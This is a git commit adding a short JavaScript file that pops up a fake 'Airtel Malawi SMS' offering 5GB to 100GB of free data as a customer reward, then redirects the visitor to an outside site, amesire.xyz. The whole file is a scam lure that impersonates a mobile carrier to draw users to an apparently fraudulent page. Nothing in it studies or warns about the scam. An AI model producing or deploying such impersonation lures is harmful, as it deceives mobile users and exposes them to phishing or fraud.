78250a1cd0b84cc920d4389d2ada335749069912
esiditid <amesire247@gmail.com>
2025-07-22 23:30:51 -0700

    Create activation-freedataairtelmalawi.js

---
+++ activation-freedataairtelmalawi.js
@@ -0,0 +1,6 @@
+
+var password = 'GET FREE DATA'
+password=prompt('AIRTEL MALAWI SMS: Dear Customer, Kindly Check If your Airtel Sim Card Is Qualify To Receive From 5GB To 100GB data, Old Customers Reward, press Get Free Data To Check Now ','GET FREE DATA');
+if (password != 'GET FREE DATA') {
+location.href='https://amesire.xyz/freedataairtelmalawi.mw';
+}
